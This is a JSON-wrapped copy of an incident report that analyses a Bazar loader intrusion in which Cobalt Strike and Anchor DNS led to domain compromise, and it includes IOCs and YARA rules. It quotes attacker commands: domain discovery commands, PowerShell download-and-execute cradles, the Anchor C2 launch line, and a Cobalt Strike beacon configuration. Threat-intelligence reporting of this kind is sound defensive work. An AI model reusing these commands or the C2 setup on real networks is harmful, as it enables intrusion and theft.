{
    "id": "30080d28-780d-42d2-890a-9111193b7e18",
    "created_at": "2023-01-12T15:10:07.489027Z",
    "updated_at": "2025-03-27T02:13:47.869726Z",
    "deleted_at": null,
    "sha1_hash": "6931ffa0688e49b555daeccec00628d561f6dc3b",
    "title": "2021-03-08 - Bazar Drops the Anchor",
    "authors": "",
    "file_creation_date": "2022-05-28T18:03:34Z",
    "file_modification_date": "2022-05-28T18:03:34Z",
    "file_size": 1777256,
    "plain_text": "# Bazar Drops the Anchor\n\n**thedfirreport.com/2021/03/08/bazar-drops-the-anchor/**\n\n### Intro\n\n\nMarch 8, 2021\n\n\n#### The malware identified as Anchor first entered the scene in late 2018 and has been linked to the same group as Trickbot, due to similarities in code and usage of the two different malware families in the same intrusions. In 2020 the Bazar malware family entered and again many associated it with the same group behind Trickbot.\n\n In an intrusion this past month we saw another link between the 3 families with a Bazar loader bringing in Anchor DNS to facilitate a full domain compromise intrusion. Over a 5 day time frame the threat actors moved from a single endpoint to full domain compromise, and while ransomware deployment was not seen in this intrusion the TTP’s used mirror what we would expect from a big game ransomware crew.\n\n### Case Summary\n\n#### In this case we started with a DocuSign themed Excel maldoc. The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader. Once Bazar was established the malware quickly injected into the Werfault process to avoid detection. As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest.\n\n\n-----\n\n#### About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor. Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.\n\n Once on the domain controller, the threat actors ran additional discovery but then went quiet. Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.\n\n During that timeframe, honey documents were interacted with and additional discovery scans were executed. The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware.\n\n However, on the fifth day the threat actors access was cut off before final objectives could be accomplished. We assess that the end goal of this intrusion was to execute domain wide ransomware.\n\n### Timeline\n\n\n-----\n\n### MITRE ATT&CK\n\n\n-----\n\n### Initial Access\n\n#### A DocuSign themed Excel xls was opened and macros were enabled. Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file.\n\n New #BazarCall #BazarLoader campaigns.\n snutrition,net > snutrition,us\n obpharmacy,net > obpharmacy,us\n XLS https://t.co/rNLglHadGV\n EXE https://t.co/D28MoDqSLD\n IOCs: https://t.co/mc56wgU8EW pic.twitter.com/GiIlKY4tT0\n\n — TheAnalyst (@ffforward) February 8, 2021\n\n The macro in this maldoc is using Excel 4 Macros.\n\n DocuSign was again the social engineering format of choice.\n\n\n-----\n\n#### After execution, Excel called out to:\n```\n https://morrislibraryconsulting[.]com/favicam/gertnm.php\n\n### Execution\n\n#### We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met. We then executed the follow on malware manually.\n\n Bazar Loader – 14wfa5dfs.exe\n\n About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.\n\n```\n\n-----\n\n#### Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.\n\n AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster. Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2.\n```\nC:\\Windows\\system32\\cmd.exe /C C:\\Windows\\Temp\\adf\\anchorAsjuster_x64.exe -source=anchorDNS_x64.exe --target=anchor_x64.exe -domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid\n\n### Defense Evasion\n\n#### Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.\n\n```\n\n-----\n\n#### Process injection was also seen in other key system executables such as winlogon.exe.\n\n Cobalt Strike was seen locking access to SMB beacons.\n\n Anchor was also seen triggering process tampering.\n\n\n-----\n\n### Credential Access\n\n#### The threat actors were seen using remote thread creation to inject into lsass to extract credentials.\n\n The same activity as seen via a the larger process tree.\n\n\n-----\n\n#### Discovery\n\n Bazar initiated some discovery activity within 10 minutes of executing.\n```\nnet view /all\nnet view /all /domain\nnltest.exe /domain_trusts /all_trusts\nnet localgroup \"administrator\"\nnet group \"domain admins\" /domain\nsysteminfo\nwhoami\nreg query hklm\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\"\n/s\nreg query hklm\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v\n\"DisplayName\" /s\nreg query hkcu\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v \"DisplayName\"\n/s\nreg query hkcu\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall /v\n\"DisplayName\" /s\n\n Cobalt Strike initiated the following discovery commands:\nnet group \\\"enterprise admins\\\" /domain\nnet group \\\"domain admins\\\" /domain\nsysteminfo\n\n```\n\n-----\n\n#### On the domain controller the following discovery was run:\n```\nnltest /dclist:\"DOMAIN.EXAMPLE\nnltest /domain_trusts /all_trusts\nIEX (New-Object Net.Webclient).DownloadString('\"http://127.0.0.1:3672/'); GetNetSubnet\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:45082/'); GetNetComputer -ping\n\n The following PowerShell command was executed from the domain controller.\n\n Decoded:\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:13773/'); ImportModule ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties\n*|select DNSHostName, IPv4Address, OperatingSystem, LastLogonDate\n\n Systems were pinged from the domain controller to confirm connectivity.\nC:\\Windows\\system32\\cmd.exe /C ping HOSTX\n\n Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.\n\n AWS was used to get the public IP of the infected machine, multiple times.\n\n```\n\n-----\n\n```\ncheckip.amazonaws.com\n\n#### Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller. This time they dropped the files on a domain controller in C:\\info\n\n```\n\n-----\n\n#### The exact files were mentioned in our Bazar, No Ryuk report.\n\n start.bat was executed with the following:\n```\nC:\\Windows\\system32\\cmd.exe /c \"\"C:\\info\\start.bat\"\"\n\n This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1\n\n The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment. This includes things like disk size, connectivity, antivirus software, and backup software. The Ryuk group has used this script\n\n```\n\n-----\n\n#### for at least a year as we ve seen them use it multiple times.\n\n This script and files are available @ https://thedfirreport.com/services/\n\n### Lateral Movement\n\n#### Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike\n\n Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.\n\n Thanks to 0xtornado and @mattnotmax for this recipe!\n\n The threat actors also used SMB beacons executed by remote services as well. We saw this across most machines in the domain.\n\n\n-----\n\n#### The threat actors also used RDP to login to multiple machines within the domain.\n\n### Collection\n\n#### We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels.\n\n### Command and Control\n\n#### Bazar:\n\n 34.210.71[.]206\n```\nCertificate:[ec:c8:db:01:a4:a3:17:36:54:a2:f5:06:44:84:5c:f6:25:6e:4f:74 ]\nNot Before:2021/02/04 02:59:01\nNot After2022/02/04 02:59:01\nIssuer Org: Global Security\nSubject Common: example.com\nSubject Org: Global Security\nPublic Algorithm:rsaEncryption\nJA3: 51c64c77e60f3980eea90869b68c58a8\nJA3s: e35df3e00ca4ef31d42b34bebaa2f86e\nCertificate: [06:32:21:0b:8b:a2:a7:3c:47:a4:33:53:11:a3:11:08:59:48:31:e2 ]\nNot Before 2020/06/12 20:00:00\nNot After 2021/05/22 08:00:00\nIssuer Org: Amazon\nSubject Common: *.v.m2.uw2.app.chime.aws [*.v.m2.uw2.app.chime.aws ]\nPublic Algorithm: rsaEncryption\nJA3:fc54e0d16d9764783542f0146a98b300\nJA3s:9e4af711131ebfb2a0cff53c4f2d64e6\n\n```\n\n-----\n\n#### We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.\n\n Anchor:\n\n The AnchorDNS malware performed C2 over DNS to the following domains:\n```\nxyskencevli.com\nsluaknhbsoe.com\n\n```\n\n-----\n\n#### Cobalt Strike:\n\n 195.123.217[.]45\n```\nJARM: 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\nCertificate: [3c:bb:96:de:a7:d7:7a:7d:61:10:7c:53:e3:d0:f5:70:43:54:61:2e ]\nNot Before: 2021/02/08 03:45:51\nNot After: 2021/05/09 04:45:51\nIssuer Org: Let's Encrypt\nSubject Common: gloomix.com [gloomix.com,www.gloomix.com ]\nPublic Algorithm: rsaEncryption\n\n Cobalt Strike Config:\n\n```\n\n-----\n\n```\n| grab_beacon_config: \n| x86 URI Response: \n| BeaconType: 0 (HTTP)\n| Port: 80\n| Polling: 45000\n| Jitter: 37\n| Maxdns: 255\n| C2 Server: 195.123.217.45,/jquery-3.3.1.min.js\n| User Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\n| HTTP Method Path 2: /jquery-3.3.2.min.js\n| Header1: \n| Header2: \n| PipeName: \n| DNS Idle: J}\\xC4q\n| DNS Sleep: 0\n| Method1: GET\n| Method2: POST\n| Spawnto_x86: %windir%\\syswow64\\dllhost.exe\n| Spawnto_x64: %windir%\\sysnative\\dllhost.exe\n| Proxy_AccessType: 2 (Use IE settings)\n|\n|\n| x64 URI Response: \n| BeaconType: 0 (HTTP)\n| Port: 80\n| Polling: 45000\n| Jitter: 37\n| Maxdns: 255\n| C2 Server: 195.123.217.45,/jquery-3.3.1.min.js\n| User Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\n| HTTP Method Path 2: /jquery-3.3.2.min.js\n| Header1: \n| Header2: \n| PipeName: \n| DNS Idle: J}\\xC4q\n| DNS Sleep: 0\n| Method1: GET\n| Method2: POST\n| Spawnto_x86: %windir%\\syswow64\\dllhost.exe\n| Spawnto_x64: %windir%\\sysnative\\dllhost.exe\n| Proxy_AccessType: 2 (Use IE settings)\n|_\n443/tcp open https\n| grab_beacon_config: \n| x86 URI Response: \n| BeaconType: 8 (HTTPS)\n| Port: 443\n| Polling: 45000\n| Jitter: 37\n| Maxdns: 255\n| C2 Server: gloomix.com,/jquery-3.3.1.min.js\n| User Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\n| HTTP Method Path 2: /jquery-3.3.2.min.js\n| Header1: \n| Header2: \n\n```\n\n-----\n\n```\n| PipeName: \n| DNS Idle: J}\\xC4q\n| DNS Sleep: 0\n| Method1: GET\n| Method2: POST\n| Spawnto_x86: %windir%\\syswow64\\dllhost.exe\n| Spawnto_x64: %windir%\\sysnative\\dllhost.exe\n| Proxy_AccessType: 2 (Use IE settings)\n|\n|\n| x64 URI Response: \n| BeaconType: 8 (HTTPS)\n| Port: 443\n| Polling: 45000\n| Jitter: 37\n| Maxdns: 255\n| C2 Server: gloomix.com,/jquery-3.3.1.min.js\n| User Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\n| HTTP Method Path 2: /jquery-3.3.2.min.js\n| Header1: \n| Header2: \n| PipeName: \n| DNS Idle: J}\\xC4q\n| DNS Sleep: 0\n| Method1: GET\n| Method2: POST\n| Spawnto_x86: %windir%\\syswow64\\dllhost.exe\n| Spawnto_x64: %windir%\\sysnative\\dllhost.exe\n| Proxy_AccessType: 2 (Use IE settings)\n|_\n\n#### ~tmp01925d3f.exe can be seen communicating with the Cobalt Strike C2 channel.\n\n### Exfiltration\n\n```\n\n-----\n\n#### No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations. We assess that this exfiltration was performed over an encrypted C2 channel. This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider.\n\n### Impact\n\n#### We believe this intrusion would have ended with domain wide ransomware. The deployment of the Get-DataInfo.ps1 script and overall TTP’s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.\n\n Enjoy our report? Please consider donating $1 or more using Patreon. Thank you for your support!\n\n We also have pcaps, memory captures, scripts, executables, and Kape packages available here\n\n### IOCs\n\n#### If you would like access to our internal MISP and/or threat feeds please see here.\n\n### Network\n\n\n-----\n\n```\n54.176.158.165\n54.193.234.163\n54.241.149.90\n208.100.26.238\n63.251.235.71\n34.210.71.206\n195.123.217.45\ngloomix.com\nhttps://morrislibraryconsulting.com/favicam/gertnm.php\nxyskencevli.com\nsluaknhbsoe.com\n\n### File\nrequest_form_1612805504.xls\n58eaac6124749d0e93df6d05a4380c22\n7e14c560484cb7e8ae065224a7d4978b9939ef9a\nd9b13ef49c80375e0a8cf20b840b1e8283b35c1a1a6adcbb4173eb25490530e0\n~tmp01925d3f.exe\nef7047a0ca52ef7f4d20281b50207f71\n61d8f56452fd9df5952fac84f10ea8520ed5958c\n10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63\nanchorAsjuster_x64.exe\n9fbc3d560d075f33a15aa67ae74ac6ef\na298c6f5f8902fb581a1b5b922f95b362747f9a7\n3ab8a1ee10bd1b720e1c8a8795e78cdc09fec73a6bb91526c0ccd2dc2cfbc28d\nanchorDNS_x64.exe\n7160ac4abb26f0ca4c1b6dfba44f8d36\n3820ff0d04a233745c79932b77eccfe743a81d34\n9fdbd76141ec43b6867f091a2dca503edb2a85e4b98a4500611f5fe484109513\nanchor_x64.exe\n0be407690fd049ea640dfc64a80c7b2a\nc9c4ef9b8b39c584d554de8afeb2be6f5648aa6d\nca72600f50c76029b6fb71f65423afc44e4e2d93257c3f95fb994adc602f3e1b\n14wfa5dfs.exe\n9a16a348d3f4e7da3e8746667624115f\nbebdec590d2a2fffaecb970b73e3067294c9125b\n2065157b834e1116abdd5d67167c77c6348361e04a8085aa382909500f1bbe69\nextracted-cobalt-strike-beacon.exe\n49dc44dfa14a76e139bf5efb4a78aca6\na47fc79bc1f0da5d292a986acdbe9057d3dd15c9\n738018c61a8db247615c9a3290c26fbbc4e230d5fbe00c4312401b90813c340c\n\n PDB paths\nanchordns_x64.exe - z:\\d\\git\\anchordns.llvm\\bin\\x64\\release\\anchordns_x64.pdb\nanchor_x64.exe - z:\\d\\git\\anchordns.llvm\\bin\\x64\\release\\anchordns_x64.pdb\n~tmp01925d3f.exe - c:\\users\\hillary\\source\\repos\\gromyko\\release\\gromyko.pdb\n\n Accessed Honey Docs\n\n```\n\n-----\n\n```\nIP: 23.94.51[.]80\nUA: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;\n.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;\nMSOffice 12)\n\n## Detections\n\n### Network\nET INFO Observed DNS Query for EmerDNS TLD (.bazar)\nETPRO POLICY External IP Check (checkip.amazonaws.com)\nETPRO TROJAN Win32/TrickBot Anchor Variant Style External IP Check\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\nET SCAN Behavioral Unusual Port 139 traffic Potential Scan or Infection\nET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex/Trickbot\nCnC)\nETPRO POLICY Possibly Suspicious example.com SSL Cert\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)\n\n Sigma\n\n#### https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_p owershell_enc_cmd.yml\n\n https://github.com/Neo23x0/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules /windows/process_creation/win_malware_trickbot_recon_activity.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_co mmands_recon_activity.yml\n\n https://github.com/Neo23x0/sigma/blob/c56cd2dfff6343f3694ef4fd606a305415599737/rules/ network/net_dns_c2_detection.yml\n\n### Yara\n\n```\n\n-----\n\n```\n/\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-02-22\nIdentifier: 1017 Anchoring Bazar\nReference: https://thedfirreport.com\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule bazar_14wfa5dfs {\nmeta:\ndescription = \"files - file 14wfa5dfs.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-02-22\"\nhash1 = \"2065157b834e1116abdd5d67167c77c6348361e04a8085aa382909500f1bbe69\"\nstrings:\n$s1 =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n ascii /* base64 encoded string '' */\n$s2 =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n ascii /* base64 encoded string '' */\n$s3 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s4 = \"0??dfg.dll ASHI128 bit 98tqewC58752F9578\" fullword ascii\n$s5 = \"*http://crl4.digicert.com/assured-cs-g1.crl0L\" fullword ascii\n$s6 = \"*http://crl3.digicert.com/assured-cs-g1.crl00\" fullword ascii\n$s7 = \"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L\" fullword ascii\n$s8 = \"appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={F61A86A8-0045-3726-D207E8A923987AD2}&lang=ru&browser=4&usagestats=1&appname\" ascii\n$s9 = \"operator co_await\" fullword ascii\n$s10 = \"appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={F61A86A8-0045-3726-D207E8A923987AD2}&lang=ru&browser=4&usagestats=1&appname\" ascii\n$s11 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s12 = \"Google LLC1\" fullword ascii\n$s13 = \"Google LLC0\" fullword ascii\n$s14 = \"Unknown issuer0\" fullword ascii\n$s15 = \"DigiCert, Inc.1$0\\\"\" fullword ascii\n$s16 = \"=Google%20Chrome&needsadmin=prefers&ap=x64-stablestatsdef_1&installdataindex=empty\" fullword ascii\n$s17 = \"TIMESTAMP-SHA256-2019-10-150\" fullword ascii\n$s18 = \"vggwqrwqr7d6\" fullword ascii\n$s19 = \"api-ms-win-core-file-l1-2-2\" fullword wide /* Goodware String - occured 1\ntimes */\n$s20 = \"__swift_2\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 3000KB and\n( pe.imphash() == \"d8af53b239700b702d462c81a96d396c\" or 8 of them )\n}\n\n```\n\n-----\n\n```\nrule cobalt_strike_tmp01925d3f {\nmeta:\ndescription = \"files - file ~tmp01925d3f.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-02-22\"\nhash1 = \"10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63\"\nstrings:\n$x1 = \"C:\\\\Users\\\\hillary\\\\source\\\\repos\\\\gromyko\\\\Release\\\\gromyko.pdb\" fullword\nascii\n$x2 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string\n'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */\n$s3 = \"gromyko32.dll\" fullword ascii\n$s4 = \"<requestedExecutionLevel level='asInvoker' uiAccess='false'/>\" fullword ascii\n$s5 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s6 = \"https://sectigo.com/CPS0\" fullword ascii\n$s7 = \"2http://crl.comodoca.com/AAACertificateServices.crl04\" fullword ascii\n$s8 = \"?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v\" fullword\nascii\n$s9 = \"3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%\" fullword ascii\n$s10 = \"http://ocsp.sectigo.com0\" fullword ascii\n$s11 = \"2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s\" fullword ascii\n$s12 = \"2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#\" fullword ascii\n$s13 = \"http://www.digicert.com/CPS0\" fullword ascii\n$s14 = \"AppPolicyGetThreadInitializationType\" fullword ascii\n$s15 = \"[email protected]\" fullword ascii\n$s16 = \"gromyko.inf\" fullword ascii\n$s17 = \"operator<=>\" fullword ascii\n$s18 = \"operator co_await\" fullword ascii\n$s19 = \"gromyko\" fullword ascii\n$s20 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 1000KB and\n( pe.imphash() == \"1b1b73382580c4be6fa24e8297e1849d\" or ( 1 of ($x*) or 4 of them ) )\n}\nrule advanced_ip_scanner {\nmeta:\ndescription = \"files - file advanced_ip_scanner.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-02-22\"\nhash1 = \"722fff8f38197d1449df500ae31a95bb34a6ddaba56834b13eaaff2b0f9f1c8b\"\nstrings:\n$x1 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"\nxmlns:asmv3=\\\"urn:schemas-microsoft-com:asm.v3\\\"><t\" ascii\n$s2 = \"fo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><security><requestedPrivileges>\n<requestedExecutionLevel level=\\\"asInvoker\\\" uiAcce\" ascii\n$s3 = \"Executable files (*.exe)\" fullword ascii\n$s4 = \"0RolUpdater.dll\" fullword wide\n$s5 = \"Qt5WinExtras.dll\" fullword ascii\n$s6 = \"Radmin.exe\" fullword ascii\n$s7 = \"ping.exe\" fullword ascii\n$s8 = \"tracert.exe\" fullword ascii\n$s9 = \"famatech.com\" fullword ascii\n\n```\n\n-----\n\n```\n$s10 advanced_ip_scanner.exe fullword wide\n$s11 = \"Z:\\\\out\\\\Release\\\\NetUtils\\\\x86\\\\advanced_ip_scanner.pdb\" fullword ascii\n$s12 = \"Qt5Xml.dll\" fullword ascii\n$s13 = \"/telnet.exe\" fullword ascii\n$s14 = \"onTargetScanned\" fullword ascii\n$s15 = \"CScanTargetsShared\" fullword ascii\n$s16 = \"1OnCmdScanSelected( CScanTargets& )\" fullword ascii\n$s17 = \"http://www.advanced-ip-scanner.com/\" fullword ascii\n$s18 = \"2CmdScanSelected( CScanTargets& )\" fullword ascii\n$s19 = \"</style></head><body style=\\\" font-family:'MS Shell Dlg 2'; font-size:8.25pt;\nfont-weight:400; font-style:normal;\\\">\" fullword ascii\n$s20 = \"<a href=\\\"http://www.radmin.com\\\">www.radmin.com</a>\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 5000KB and\n( pe.imphash() == \"a3bc8eb6ac4320e91b7faf1e81af2bbf\" or ( 1 of ($x*) or 4 of them ) )\n}\nrule anchor_x64 {\nmeta:\ndescription = \"files - file anchor_x64.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-02-22\"\nhash1 = \"ca72600f50c76029b6fb71f65423afc44e4e2d93257c3f95fb994adc602f3e1b\"\nstrings:\n$x1 = \"cmd.exe /c timeout 3 && \" fullword wide\n$x2 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\">\n<trustInfo><security><requestedPrivileges><requeste\" ascii\n$x3 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string\n'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */\n$s4 = \"\\\\System32\\\\cmd.ex\\\\System32\\\\rundllP\" fullword ascii\n$s5 = \"Z:\\\\D\\\\GIT\\\\anchorDns.llvm\\\\Bin\\\\x64\\\\Release\\\\anchorDNS_x64.pdb\" fullword\nascii\n$s6 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s7 = \"cutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel>\n</requestedPrivileges></security></trustInfo><appli\" ascii\n$s8 = \"thExecute\" fullword ascii\n$s9 = \"on xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware\nxmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSe\" ascii\n$s10 = \"WinHTTP loader/1.0\" fullword wide\n$s11 = \"AppPolicyGetThreadInitializationType\" fullword ascii\n$s12 = \"AnchorDNS.cpp\" fullword ascii\n$s13 = \"hardWorker.cpp\" fullword ascii\n$s14 = \"operator<=>\" fullword ascii\n$s15 = \"operator co_await\" fullword ascii\n$s16 = \"/C PowerShell \\\"Start-Slemove-Iteep 3; Re\" fullword wide\n$s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\">\n<trustInfo><security><requestedPrivileges><requeste\" ascii\n$s18 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s19 = \"UAWAVAUATVWSH\" fullword ascii\n$s20 = \"AWAVAUATVWUSH\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 1000KB and\n( pe.imphash() == \"e2450fb3cc5b1b7305e3193fe03f3369\" or ( 1 of ($x*) or 4 of them ) )\n}\n\n```\n\n-----\n\n```\nrule anchorDNS_x64 {\nmeta:\ndescription = \"files - file anchorDNS_x64.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-02-22\"\nhash1 = \"9fdbd76141ec43b6867f091a2dca503edb2a85e4b98a4500611f5fe484109513\"\nstrings:\n$x1 = \"cmd.exe /c timeout 3 && \" fullword wide\n$x2 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\">\n<trustInfo><security><requestedPrivileges><requeste\" ascii\n$x3 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware string\n'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */\n$s4 = \"\\\\System32\\\\cmd.ex\\\\System32\\\\rundllP\" fullword ascii\n$s5 = \"Z:\\\\D\\\\GIT\\\\anchorDns.llvm\\\\Bin\\\\x64\\\\Release\\\\anchorDNS_x64.pdb\" fullword\nascii\n$s6 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s7 = \"cutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"></requestedExecutionLevel>\n</requestedPrivileges></security></trustInfo><appli\" ascii\n$s8 = \"thExecute\" fullword ascii\n$s9 = \"on xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"><windowsSettings><dpiAware\nxmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSe\" ascii\n$s10 = \"WinHTTP loader/1.0\" fullword wide\n$s11 = \"AppPolicyGetThreadInitializationType\" fullword ascii\n$s12 = \"AnchorDNS.cpp\" fullword ascii\n$s13 = \"hardWorker.cpp\" fullword ascii\n$s14 = \"operator<=>\" fullword ascii\n$s15 = \"operator co_await\" fullword ascii\n$s16 = \"/C PowerShell \\\"Start-Slemove-Iteep 3; Re\" fullword wide\n$s17 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\">\n<trustInfo><security><requestedPrivileges><requeste\" ascii\n$s18 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s19 = \"UAWAVAUATVWSH\" fullword ascii\n$s20 = \"AWAVAUATVWUSH\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 1000KB and\n( pe.imphash() == \"e2450fb3cc5b1b7305e3193fe03f3369\" or ( 1 of ($x*) or 4 of them ) )\n}\nrule anchorAsjuster_x64 {\nmeta:\ndescription = \"files - file anchorAsjuster_x64.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-02-22\"\nhash1 = \"3ab8a1ee10bd1b720e1c8a8795e78cdc09fec73a6bb91526c0ccd2dc2cfbc28d\"\nstrings:\n$s1 = \"curity><requestedPrivileges><requestedExecutionLevel level=\\\"asInvoker\\\"\nuiAccess=\\\"false\\\"></requestedExecutionLevel></requeste\" ascii\n$s2 = \"anchorAdjuster* --source=<source file> --target=<target file> --domain=<domain\nname> --period=<recurrence interval, minutes, def\" ascii\n$s3 = \"anchorAdjuster* --source=<source file> --target=<target file> --domain=<domain\nname> --period=<recurrence interval, minutes, def\" ascii\n$s4 = \"target file \\\"%s\\\"\" fullword ascii\n$s5 = \"--target=\" fullword ascii\n\n```\n\n-----\n\n```\n$s6 hemas.microsoft.com/SMI/2005/WindowsSettings\\ >true</dpiAware>\n</windowsSettings></application></assembly>\" fullword ascii\n$s7 = \"error write file, written %i bytes, need write %i bytes, error code %i\"\nfullword ascii\n$s8 = \"error create file \\\"%s\\\", code %i\" fullword ascii\n$s9 = \"guid: %s, shift 0x%08X(%i)\" fullword ascii\n$s10 = \"ault value 15> -guid --count=<count of instances>\" fullword ascii\n$s11 = \"domain: shift 0x%08X(%i)\" fullword ascii\n$s12 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\">\n<trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii\n$s13 = \"vileges></security></trustInfo><application xmlns=\\\"urn:schemas-microsoftcom:asm.v3\\\"><windowsSettings><dpiAware xmlns=\\\"http:/\" ascii\n$s14 = \"wrong protocol type\" fullword ascii /* Goodware String - occured 567 times */\n$s15 = \"network reset\" fullword ascii /* Goodware String - occured 567 times */\n$s16 = \"owner dead\" fullword ascii /* Goodware String - occured 567 times */\n$s17 = \"connection already in progress\" fullword ascii /* Goodware String - occured\n567 times */\n$s18 = \"network down\" fullword ascii /* Goodware String - occured 567 times */\n$s19 = \"protocol not supported\" fullword ascii /* 